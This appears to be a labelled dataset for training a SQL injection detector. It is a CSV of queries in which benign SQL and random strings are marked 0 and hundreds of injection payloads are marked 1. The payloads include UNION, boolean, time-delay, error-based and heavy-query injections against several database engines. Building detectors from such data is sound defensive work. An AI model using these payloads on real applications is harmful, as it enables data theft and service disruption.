Query,Label
"1"" ) ) as vxkn where 2443 = 2443 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
SELECT * FROM arm WHERE tired NOT BETWEEN 'hold' AND 'twice',0
SELECT * FROM court WHERE cross BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM tool WHERE NOT news = 'related',0
select ( case when ( 1275 = 7674 ) then 1275 else 1275* ( select 1275 from information_schema.character_sets ) end ) #,1
"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""jref"" like ""jref",1
"1"" ) as dlfq where 8410 = 8410",1
"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1
"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""regi"" like ""regi",1
SELECT * FROM increase 3 SELECT * FROM train,0
cubillos del sil,0
20150,0
"select * from users where id = 1<@.. union select 1,version ( ) -- 1",1
SELECT * FROM brass WHERE activity = 'closely' AND City = 'willing',0
71648159p,0
"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",1
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0
jelisic@sevach.pf,0
"1"" ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""rwlq"" = ""rwlq",1
"-9937' ) ) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",1
"c/ benasau, 196, 10?h",0
SELECT * FROM Customers WHERE Country IN ( SELECT Country FROM Suppliers ) ;,0
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,0
"1' ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
desfacedora,0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'njnr' = 'njnr",1
"-5998"" ) as gazd where 2814 = 2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1
vencilln,0
jiinshuh,0
"1 ) where 1415 = 1415 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",1
SELECT DISTINCT composed FROM figure,0
1 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
marlow@botilleria.com.ec,0
"' AND (SELECT CASE WHEN (SELECT SUBSTRING(version(),1,1))='P' THEN pg_sleep(14) ELSE pg_sleep(0) END) --",1
"1' ) where 3255 = 3255 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"-7255' union all select 2127,2127,2127,2127,2127#",1
SELECT * FROM put ORDER BY cowboy DESC,0
"SELECT Orders.seldomrID, Employees.occur, Employees.income FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.weekID ORDER BY Orders.cowboyID",0
"( select * from generate_series ( 4990,4990,case when ( 4990 = 5065 ) then 1 else 0 end ) limit 1 )",1
"-9176' ) ) as eunw where 5978 = 5978 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT * FROM thank 3 SELECT * FROM go,0
-5982' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ikuh' = 'ikuh,1
basilia,0
moneder-a,0
"1%"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
"-1418"" ) where 7528 = 7528 order by 1#",1
"-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1
SELECT sell ( s ) FROM sunlight SELECT done FROM picture,0
SELECT * FROM load WHERE living BETWEEN 10 AND 20,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) # idxq",1
SELECT * FROM cave ORDER BY whale,0
"SELECT COUNT ( piece ) , but FROM add BY main",0
SELECT * FROM suit 3 SELECT * FROM blue,0
SELECT TOP 3 * FROM decide,0
-7369 or 9323 = 9323#,1
"1"" ) as giqb where 4664 = 4664",1
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'qbdm' = 'qbdm",1
"-1763"" ) or elt ( 1032 = 1032,3623 ) and ( ""nqvv"" = ""nqvv",1
SELECT AVG ( broad ) FROM trouble,0
0utaperc09,0
"1"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT hurryID AS ID, modern AS broke FROM stage",0
"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1
"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1
alabiada,0
"-4135' ) ) ) union all select 4413,4413,4413#",1
"SELECT scientist,film,experiment FROM bone LEFT JOIN Orders ON stretch.mailID = least.brass ORDER BY shoot.hurried",0
"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc",1
SELECT TOP 50 PERCENT * FROM tin SELECT * FROM here FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM result,0
"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'zxon' like 'zxon",1
1 ) where 3979 = 3979 rlike sleep ( 5 ) --,1
"1"" ) where 8407 = 8407 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT * FROM positive FETCH FIRST 50 PERCENT ROWS ONLY,0
-9562' or 8571 = 8571--,1
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers; TRUNCATE TABLE Categories;",0
-5764 or 3038 = 3038,1
SELECT * FROM clothes WHERE local IN ( SELECT fresh FROM heavy ),0
SELECT * FROM element 3,0
63298862x,0
"1"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ""cbck"" like ""cbck",1
select ( case when ( 1272 = 5883 ) then 1272 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM from,0
SELECT * FROM student WHERE replace BETWEEN 10 AND 20,0
escuder liveris,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 27990 ) ORDER BY meta_id ASC",0
1 where 8393 = 8393,1
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 'squj' = 'squj",1
SELECT * FROM bread,0
SELECT * FROM carbon WHERE seeing = quickly,0
SELECT * FROM neighborhood FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cause,0
SELECT AVG ( Price ) FROM who,0
"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1
-5970' where 2769 = 2769 union all select 2769--,1
1%' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = ',1
"1"" where 9083 = 9083 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
SELECT * FROM idea WHERE improve BETWEEN 10 AND 20,0
"1%"" and make_set ( 8403 = 8403,8899 ) and ""%"" = """,1
"iif ( 3760 = 4785,1,1/0 )",1
1 ) where 7552 = 7552 order by 1#,1
"SELECT givenID AS ID, bus AS dust FROM goose",0
1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'foop' like 'foop,1
"-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#",1
DELETE FROM cannot WHERE zebra = 'troops',0
DELETE FROM likely,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 262310,262326,262328 ) ORDER BY meta_id ASC",0
SELECT * FROM tribe WHERE ought = 'possible' OR carried = 'pattern',0
SELECT * FROM adult WHERE event BETWEEN '1996-07-01' AND '1996-07-31',0
"1', ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",1
"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",1
"1' in boolean mode ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",1
pillars4,0
SELECT * FROM smallest FETCH FIRST 50 PERCENT ROWS ONLY,0
cremades@baltasarsantos.kn,0
SELECT expect ( s ) FROM say LEFT JOIN,0
"SELECT fix AS past, morning AS [recognize] FROM tape",0
nuo gmez,0
"SELECT * FROM across WHERE desk NOT IN ( 'window', 'laid', 'eat' )",0
"1%"" ) ) ) and make_set ( 8191 = 7813,7813 ) and ( ( ( ""%"" = """,1
"SELECT Orders.musicalrID, Employees.figure, Employees.between FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.forgetID ORDER BY Orders.circusID",0
"SELECT canal, crew+ ', ' + sent+ ' ' + log+ ', ' + bat AS needed FROM further",0
alcarrs,0
ulls,0
SELECT cannot FROM half UNION SELECT curve FROM very ORDER BY machinery,0
"iif ( 8770 = 9611,1,1/0 )",1
"SELECT Orders.pigrID, Employees.shirt, Employees.already FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.hornID ORDER BY Orders.goldID",0
"SELECT soilID AS ID, muscle AS many FROM band",0
"1 ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1
SELECT option_value FROM wp_options WHERE option_name = 'options_instagram_url' LIMIT 1,0
SELECT * FROM turn WHERE central LIKE '%who%',0
"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'sstt' = 'sstt",1
-2036' ) or ( 8459 = 8459 ) *4906 and ( 'hjeu' = 'hjeu,1
"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1
"-2312' ) ) ) union all select 5282,5282,5282,5282,5282,5282,5282,5282--",1
"1'|| ( select 'tdcr' where 6792 = 6792 union all select null,null,null,null,null#",1
10161,0
anuar,0
"1"" where 1765 = 1765 union all select null,null,null,null,null,null#",1
"1%"" ) ) ) union all select null,null,null,null,null,null,null--",1
"-9451%"" ) union all select 9963,9963,9963--",1
"1"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT * FROM complex WHERE Price NOT BETWEEN 10 AND 20,0
furet@sanchezquesada.lc,0
graciliano,0
"select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1
SELECT * FROM vessels FETCH FIRST 3 ROWS ONLY,0
1' where 8864 = 8864,1
SELECT * FROM railroad WHERE pan NOT LIKE '[rays]%',0
.s,1
23 or 1 = 1; --,1
"-6775"" union all select 7484,7484#",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c830bdbb26' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT * FROM summer 3,0
"1"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"SELECT late, properly, furniture FROM travel WHERE fort IS NULL",0
SELECT string ( s ) FROM possible SELECT knew ( s ),0
"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1
"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT AVG ( circus ) FROM instead SELECT SUM ( secret ),0
"iif ( 2869 = 9448,1,1/0 )",1
"SELECT pig, obtain, rising FROM according WHERE excited IS NULL",0
1 ) ) as jvvs where 9594 = 9594,1
"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 5098 = 5098",1
4377,0
espinoza@canariasatuaire.lb,0
DELETE FROM dust,0
SELECT Count ( * ) AS silver,0
-9650' ) or 1390 = 3209,1
1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
SELECT * FROM something WHERE characteristic BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM ( SELECT fight FROM roll ),0
SELECT TOP 3 * FROM straight WHERE soon = 'shinning' SELECT * FROM leave,0
"1"" ) ) as oxrr where 6141 = 6141 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
SELECT * FROM draw WHERE not NOT LIKE '[spite]%',0
1' where 3337 = 3337 and 8403 = 5760,1
"1'+ ( select 'dbvq' where 2045 = 2045 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"1"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
saleh,0
"1 ) as iovi where 3910 = 3910 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
xerta,0
"-5616"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""hdrb"" like ""hdrb",1
"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""krtr"" like ""krtr",1
SELECT away ( s ) FROM clothing FULL OUTER JOIN,0
select ( case when ( 6615 = 3564 ) then 1 else 6615* ( select 6615 from master..sysdatabases ) end ) --,1
SELECT AVG ( attack ) FROM over,0
9.20248E+15,0
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty,0
"-1868 ) ) union all select 1859,1859--",1
SELECT steep ( s ) FROM nervous SELECT sat ( s ),0
SELECT * FROM graph WHERE tower = 'actual' AND ( gas = 'these' OR yard = 'eat' ),0
"1"" ) ) and 8329 = 5584#",1
"1"" ) where 2680 = 2680 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
SELECT find FROM small UNION SELECT lose FROM tears ORDER BY harder,0
"plaza del yunque, 4,",0
-8409 ) ) as ipbz where 9984 = 9984 or 3371 = 3869,1
terangue,0
SELECT Count ( * ) AS column,0
"UPDATE road SET separate = 'particular', City = 'freedom' WHERE chapter = favorite",0
select sleep ( 5 ) and '%' = ',1
"( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 2768 = 2768,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1
"-4031"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""auhn"" = ""auhn",1
dec4mas8xt6,0
SELECT note,0
coder,0
SELECT * FROM upper WHERE mainly BETWEEN 'these' AND 'clay',0
1' where 4115 = 4115,1
"1%' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
UEv,1
"1 union all select null,null,null,null,null,null#",1
lesire@masqueclases.gn,0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1
"cerollera, la",0
SELECT sudden ( s ) FROM worry UNION,0
1 and user_name ( ) = 'dbo',1
"-4248"" ) ) union all select 9450,9450,9450--",1
"1 ) as czeu where 1738 = 1738 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
SELECT AVG ( Price ) FROM on,0
SELECT TOP 50 PERCENT * FROM combination,0
mcallum,0
goring@quadernideilgarda.pl,0
SELECT * FROM clearly ORDER BY planning,0
"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
open3,0
1'+ ( select kzgg where 5070 = 5070,1
SELECT * FROM colony WHERE cook = everybody,0
"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",1
"SELECT scaredID AS ID, jungle AS rice FROM carefully",0
kiyohara,0
"1' ) as bdei where 9531 = 9531 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1%"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1
SELECT MAX ( Price ) AS LargestPrice FROM Products;,0
SELECT TOP 50 PERCENT * FROM lot,0
"1 where 9279 = 9279 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
SELECT TOP 3 * FROM syllable WHERE beyond = 'fireplace',0
1 ) as iknl where 3885 = 3885 rlike sleep ( 5 ) #,1
SELECT * FROM police WHERE frame = 'fifty' AND ( plain = 'noise' OR court = 'should' ),0
"SELECT crossID AS ID, nothing AS represent FROM which",0
SELECT * FROM ( SELECT motion FROM sum ),0
"1%"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT tide FROM aboard,0
SELECT AVG ( hurry ) FROM name SELECT SUM ( phrase ),0
pijahumeda,0
SELECT * FROM anywhere WHERE stick = 'bit' AND City = 'mine',0
SELECT TOP 3 * FROM trail,0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf' = 'osqf",1
"SELECT * FROM electric ORDER BY mainly, sort",0
"calle vadell, 177",0
"SELECT careful, aware, reasonFROM plane WHERE flag IS NOT NULL",0
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367533 ),0
"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",1
"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",1
1' ) union all select null--,1
50835477a,0
SELECT * FROM island WHERE usually = 'way' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM ( SELECT unit FROM driving ),0
"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
"select * from users where id = 1 or 1#""{ union select 'a',version ( ) -- 1",1
SELECT TOP 50 PERCENT * FROM hidden SELECT * FROM labor FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pictured,0
SELECT * FROM monkey WHERE NOT total = 'excellent' AND NOT hundred = 'actual',0
06673981w,0
DELETE FROM silence,0
SELECT * FROM ( SELECT slide FROM breath ),0
"SELECT * FROM correct ORDER BY clothing, leader",0
-9553 ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 5299 = 5299,1
SELECT * FROM power WHERE thick = 'accept' AND City = 'native',0
SELECT * FROM told WHERE complete BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT boardID AS ID, advice AS quite FROM automobile",0
"glorieta puerta de hierro, 57",0
equilibrio,0
SELECT MIN ( around ) AS major FROM found,0
-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1
brait_burbridge@fichajes.nom.ic,0
79039106c,0
tharsis s/n 11?c,0
SELECT * FROM pair WHERE identity NOT LIKE '[chain]%',0
1' ) ) ) and sleep ( 5 ) #,1
"1 ) ) as xvyi where 6701 = 6701 union all select null,null,null,null#",1
"-3872%"" ) ) ) union all select 1637,1637,1637,1637,1637#",1
SELECT AVG ( hurt ) FROM diagram SELECT SUM ( blood ),0
"1%"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",1
SELECT MIN ( ring ) AS arrangement FROM tree,0
sanet y negrals,0
"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1
1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'lajk' = 'lajk,1
"-7240' ) ) union all select 8064,8064,8064#",1
